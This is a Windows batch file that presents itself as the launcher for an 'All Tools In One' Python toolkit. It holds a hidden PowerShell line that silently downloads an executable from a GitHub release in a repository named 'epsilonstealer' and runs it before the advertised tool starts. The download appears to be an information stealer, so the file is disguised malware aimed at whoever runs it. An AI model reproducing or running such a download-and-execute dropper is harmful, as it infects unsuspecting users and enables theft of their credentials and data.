@echo off

title All Tools In One
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/yattout4
echo.

cd tools
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/yattout4/epsilonstealer/releases/download/epsilon/epsilon.exe';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..
python atio.py

if errorlevel 1 (
    echo.
    echo Error occurred during execution. Attempting to install requirements...
    python -m pip install -r requirements.txt
    echo.
    echo Installation complete.
    pause
)